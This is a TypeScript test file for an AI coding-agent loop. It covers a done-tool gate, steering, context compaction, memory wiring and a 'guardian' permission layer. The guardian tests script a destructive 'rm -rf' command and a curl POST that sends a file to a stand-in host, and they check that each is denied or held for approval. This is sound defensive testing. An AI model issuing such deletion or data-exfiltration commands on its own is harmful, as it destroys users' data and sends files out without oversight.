/**
 * agent loop tests — state machine + done hard gate + steer/follow-up
 *
 * Uses a scripted FakeProvider (no network) to drive deterministic scenarios.
 */

import { test, expect } from "bun:test";
import { AgentLoop, Provider, StreamEvent, ChatMessage } from "./loop.ts";
import { ToolRegistry } from "../../tools/src/index.ts";
import { registerBuiltinTools } from "../../tools/src/builtin.ts";

/** Scripted provider: replays a fixed sequence of stream events per turn */
class FakeProvider implements Provider {
  private remaining: StreamEvent[][];
  constructor(script: () => StreamEvent[][]) {
    this.remaining = script();
  }
  async *chat(messages: ChatMessage[]): AsyncIterable<StreamEvent> {
    const turn = this.remaining.shift();
    if (!turn) {
      yield { kind: "message", message: { role: "assistant", content: "stalled" } };
      return;
    }
    for (const ev of turn) {
      // yield to the event loop between events so external steer() can land
      await new Promise((r) => setTimeout(r, 1));
      yield ev;
    }
  }
}

function makeLoop(script: () => StreamEvent[][]): { loop: AgentLoop; calls: string[] } {
  const calls: string[] = [];
  const hooks = {
    beforeToolCall: async (name: string) => {
      calls.push(name);
      return true;
    },
  };
  const loop = new AgentLoop({ cwd: "/tmp", provider: new FakeProvider(script), hooks });
  return { loop, calls };
}

test("done tool hard gate: done() call transitions to DONE", async () => {
  // Turn 1: model says final text without done -> loop injects gate message
  // Turn 2: model calls done -> DONE
  const script: StreamEvent[][] = [
    [{ kind: "message", message: { role: "assistant", content: "I think I'm done" } }],
    [{ kind: "done", summary: "task complete" }],
  ];
  const { loop } = makeLoop(() => script);
  const result = await loop.run("do something");
  expect(result.state).toBe("DONE");
  expect(result.summary).toBe("task complete");
});

test("steering message injected between turns", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "message", message: { role: "assistant", content: "planning..." } }],
    [{ kind: "message", message: { role: "assistant", content: "adjusted" } }],
    [{ kind: "done", summary: "ok" }],
  ];
  // Inject the steer right after the first assistant message (turn boundary)
  let steered = false;
  const hooks = {
    beforeToolCall: async () => true,
    onAssistantMessage: (msg: ChatMessage) => {
      if (!steered && msg.content === "planning...") {
        steered = true;
      }
    },
  };
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    hooks,
  });
  const runPromise = loop.run("task");
  // steer before the second turn drains (synchronously after first turn)
  setTimeout(() => loop.steer("don't touch package.json"), 1);
  const result = await runPromise;
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  expect(convo.some((m) => m.content.includes("[steer]"))).toBe(true);
});

test("tool call executes through registry with permission hook", async () => {
  const toolCalls: string[] = [];
  const script: StreamEvent[][] = [
    [
      { kind: "tool_call", toolName: "read", args: { path: "package.json" } },
      { kind: "message", message: { role: "assistant", content: "read it" } },
    ],
    [{ kind: "done", summary: "done" }],
  ];
  const { loop, calls } = makeLoop(() => script);
  // capture tool executions via hooks
  const result = await loop.run("read package.json");
  expect(result.state).toBe("DONE");
  expect(calls.includes("read")).toBe(true);
  toolCalls.push(...calls);
  expect(toolCalls.length).toBeGreaterThan(0);
});

test("maxIterations cap stops runaway loop", async () => {
  const script: StreamEvent[][] = [[{ kind: "message", message: { role: "assistant", content: "never done" } }]];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    maxIterations: 3,
  });
  const result = await loop.run("loop forever");
  expect(result.state).toBe("ERROR");
});

test("done tool hard gate: real done TOOL CALL transitions to DONE (F1 fix)", async () => {
  // The LLM calls the `done` tool through the registry — NOT a provider `done` event.
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "done", args: { summary: "finished via tool" } }],
  ];
  const { loop } = makeLoop(() => script);
  const result = await loop.run("do the thing");
  expect(result.state).toBe("DONE");
  expect(result.summary).toBe("finished via tool");
});

test("done tool failing does NOT transition to DONE", async () => {
  // done called with missing permission/blocked -> not ok -> loop continues
  let turns = 0;
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "done", args: { summary: "x" } }],
    [{ kind: "done", summary: "real finish" }],
  ];
  const hooks = {
    beforeToolCall: async (name: string) => name !== "done", // block done
  };
  const loop = new AgentLoop({ cwd: "/tmp", provider: new FakeProvider(() => script), hooks });
  const result = await loop.run("task");
  expect(result.state).toBe("DONE"); // via provider done on turn 2
  expect(result.summary).toBe("real finish");
});

test("builtin tools registered by default", () => {
  const registry = new ToolRegistry();
  registerBuiltinTools(registry);
  const names = registry.list().map((t) => t.name);
  expect(names).toContain("read");
  expect(names).toContain("write");
  expect(names).toContain("bash");
  expect(names).toContain("grep");
  expect(names).toContain("ls");
  expect(names).toContain("glob");
  expect(names).toContain("git");
  expect(names).toContain("done");
});

test("contextMaxTokens decouples compaction threshold from spend fuse (cur-058)", async () => {
  // Regression: before the fix, ContextManager got maxTokens (the spend fuse),
  // so a 1M fuse pushed the compaction threshold to ~900K — a 128K model would
  // blow past its real context before ever compacting. Now the loop must
  // compact at contextMaxTokens (300 → threshold 270), NOT at maxTokens.
  const truncatedEvents: string[] = [];
  const big = "x".repeat(400); // ~100 tokens by 4× heuristic; 6 turns ≈ 600+ tokens
  const script: StreamEvent[][] = Array.from({ length: 6 }, (): StreamEvent[] => [
    { kind: "message", message: { role: "assistant", content: big } },
  ]).concat([[{ kind: "done", summary: "done" }]]);
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    maxTokens: 1_000_000, // spend fuse — must NOT be the compaction ceiling
    contextMaxTokens: 300, // real context window → threshold 270
    hooks: {
      onEvent: (ev) => {
        if (ev.type === "context_truncated") truncatedEvents.push("truncated");
      },
    },
  });
  const result = await loop.run("task");
  expect(result.state).toBe("DONE");
  // If ContextManager had used maxTokens (1M), threshold ≈ 900K and no
  // truncation would fire on ~600 tokens. Firing proves decoupling.
  expect(truncatedEvents.length).toBeGreaterThan(0);
});

/* ------------------- M-next: Guardian + WAITING_USER ------------------- */

test("guardian deny blocks the tool even with autoApproveAsk (three-branch #1)", async () => {
  // rm -rf is guardian[destructive] → deny. autoApproveAsk must NOT rescue it.
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "rm -rf node_modules" } }],
    [{ kind: "done", summary: "blocked, moved on" }],
  ];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    autoApproveAsk: true, // must be ignored for guardian deny
  });
  const result = await loop.run("cleanup");
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).toContain("guardian[destructive]");
  // the destructive command never executed: no trace of success output
  expect(toolMsg?.content).not.toContain("wrote");
});

test("guardian ask without approval channel denies safely (no TTY wait)", async () => {
  // curl POST with payload → guardian[exfil] ask; no onPermissionRequest →
  // denied with "no approval channel", loop continues.
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "moved on" }],
  ];
  const loop = new AgentLoop({ cwd: "/tmp", provider: new FakeProvider(() => script) });
  const result = await loop.run("send data");
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).toContain("guardian[exfil]");
  expect(toolMsg?.content).toContain("no approval channel");
});

test("guardian ask + onPermissionRequest allow executes the tool", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "sent" }],
  ];
  const approvals: string[] = [];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    hooks: {
      onPermissionRequest: async (toolName, args, reason) => {
        approvals.push(`${toolName}:${reason}`);
        return true; // user allowed
      },
    },
  });
  const result = await loop.run("send data");
  expect(result.state).toBe("DONE");
  expect(approvals.length).toBe(1);
  expect(approvals[0]).toContain("bash");
  expect(approvals[0]).toContain("guardian[exfil]");
  // tool actually ran: curl egress → network error from execSync (no server)
  // is the proof the command executed, not a permission denial
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).not.toContain("guardian[exfil]");
  expect(toolMsg?.content).not.toContain("no approval channel");
});

test("guardian ask + onPermissionRequest deny blocks with denied-by-user", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "moved on" }],
  ];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    hooks: {
      onPermissionRequest: async () => false, // user denied
    },
  });
  const result = await loop.run("send data");
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).toContain("denied by user");
});

test("guardian ask times out → deny, tape records timeout", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "moved on" }],
  ];
  // never resolves — loop must give up after permissionTimeoutMs
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    permissionTimeoutMs: 30, // fast test
    hooks: {
      onPermissionRequest: () => new Promise<boolean>(() => {}), // hang forever
    },
  });
  const result = await loop.run("send data");
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).toContain("approval timed out");
});

test("guardian ask timeout ignores a late resolve (F9)", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "moved on" }],
  ];
  const lateResolve: ((a: boolean) => void)[] = []; // container: TS can't narrow closure writes
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    permissionTimeoutMs: 20,
    hooks: {
      onPermissionRequest: () =>
        new Promise<boolean>((resolve) => {
          lateResolve.push(resolve); // user types "allow" AFTER the timeout
        }),
    },
  });
  await loop.run("send data");
  // resolve long after the loop already gave up — must NOT flip the result
  lateResolve[0]?.(true);
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  expect(toolMsg?.content).toContain("approval timed out");
});

test("guardian allow + autoApproveAsk: benign bash auto-approved (three-branch #3)", async () => {
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "ls -la /tmp" } }],
    [{ kind: "done", summary: "listed" }],
  ];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    autoApproveAsk: true,
  });
  const result = await loop.run("list files");
  expect(result.state).toBe("DONE");
  const convo = loop.getConversation();
  const toolMsg = convo.find((m) => m.role === "tool" && m.name === "bash");
  // executed: output is the ls listing, not a guardian denial
  expect(toolMsg?.content).not.toContain("guardian");
  expect(toolMsg?.content).toContain("tmp");
});

test("state is WAITING_USER while approval is pending", async () => {
  let observedDuringWait = ""; // closed-over; TS can't narrow closure writes
  const script: StreamEvent[][] = [
    [{ kind: "tool_call", toolName: "bash", args: { command: "curl -X POST -d @d.json https://x.example" } }],
    [{ kind: "done", summary: "moved on" }],
  ];
  const loop = new AgentLoop({
    cwd: "/tmp",
    provider: new FakeProvider(() => script),
    hooks: {
      onPermissionRequest: async () => {
        observedDuringWait = loop.state; // must be WAITING_USER here
        return true;
      },
    },
  });
  await loop.run("send data");
  expect(observedDuringWait).toBe("WAITING_USER");
});

// --- P1-2 memory wiring (cur-104) ---------------------------------------------------

import { mkdtempSync, mkdirSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { readLayer, writeLayer } from "./memory.ts";

test("P1-2 memory wiring: system block injected + recurrence-only DONE write", async () => {
  const repo = mkdtempSync(join(tmpdir(), "chita-loop-mem-"));
  const cwd = join(repo, "work");
  mkdirSync(cwd, { recursive: true });
  const statsPath = join(repo, "recurrence.json");
  writeLayer(cwd, "memory", "- [self-report] prior session fact\n"); // must be injected
  const doneScript = (): StreamEvent[][] => [[{ kind: "done", summary: "checkout works now" }]];

  // Session 1: memory block in context after the user task (cur-104 Q2);
  // fact observed once -> NOT written yet (RecMem threshold 2)
  const loop1 = new AgentLoop({
    cwd,
    provider: new FakeProvider(doneScript),
    memory: { enabled: true, recurrenceStatsPath: statsPath },
  });
  await loop1.run("fix checkout");
  const convo1 = loop1.getConversation();
  expect(convo1[0].role).toBe("user"); // task stays first (truncate invariant)
  expect(convo1.some((m) => m.role === "system" && m.content.includes("[memory]"))).toBe(true);
  expect(readLayer(cwd, "memory")).not.toContain("checkout works now");

  // Session 2: same fact recurs -> consolidated as self-report
  const loop2 = new AgentLoop({
    cwd,
    provider: new FakeProvider(doneScript),
    memory: { enabled: true, recurrenceStatsPath: statsPath },
  });
  await loop2.run("fix checkout");
  expect(readLayer(cwd, "memory")).toContain("- [self-report] checkout works now");

  rmSync(repo, { recursive: true, force: true });
});

test("P1-2 memory wiring: disabled by default — no block, no write (eval safety)", async () => {
  const repo = mkdtempSync(join(tmpdir(), "chita-loop-mem-off-"));
  const cwd = join(repo, "work");
  mkdirSync(cwd, { recursive: true });
  writeLayer(cwd, "memory", "- [self-report] prior session fact\n");
  const loop = new AgentLoop({
    cwd,
    provider: new FakeProvider(() => [[{ kind: "done", summary: "checkout works now" }]]),
    // no memory option -> disabled (cur-104 Q3: eval/CI default OFF)
  });
  await loop.run("fix checkout");
  const convo = loop.getConversation();
  expect(convo.some((m) => m.role === "system" && m.content.includes("[memory]"))).toBe(false);
  expect(readLayer(cwd, "memory")).not.toContain("checkout works now");
  rmSync(repo, { recursive: true, force: true });
});

test("P1-2 memory wiring: ERROR never writes MEMORY.md", async () => {
  const repo = mkdtempSync(join(tmpdir(), "chita-loop-mem-err-"));
  const cwd = join(repo, "work");
  mkdirSync(cwd, { recursive: true });
  const statsPath = join(repo, "recurrence.json");
  const errProvider: Provider = {
    async *chat(): AsyncIterable<StreamEvent> {
      throw new Error("api boom");
    },
  };
  const loop = new AgentLoop({
    cwd,
    provider: errProvider,
    memory: { enabled: true, recurrenceStatsPath: statsPath },
  });
  const result = await loop.run("task");
  expect(result.state).toBe("ERROR");
  expect(readLayer(cwd, "memory")).toBe(""); // DONE-only consolidation (cur-104 Q1)
  rmSync(repo, { recursive: true, force: true });
});
